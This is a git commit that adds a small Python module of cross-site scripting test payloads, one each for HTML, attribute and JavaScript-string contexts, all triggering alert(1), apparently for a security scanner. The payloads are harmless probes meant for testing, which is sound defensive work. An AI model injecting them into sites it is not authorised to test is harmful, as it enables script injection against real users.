384e63f67eb4ff59a9657046733b9c43d3af1420
Omar Abdelsalam <oe7836196@gmail.com>
2026-01-04 04:06:22 +0200

    Add XSS payloads for testing purposes

---
+++ modules/xss/payloads.py
@@ -0,0 +1,11 @@
+PAYLOADS = {
+    "html": [
+        '<svg/onload=alert(1)>'
+    ],
+    "attr": [
+        '" autofocus onfocus=alert(1) x="'
+    ],
+    "js": [
+        "';alert(1);//"
+    ]
+}
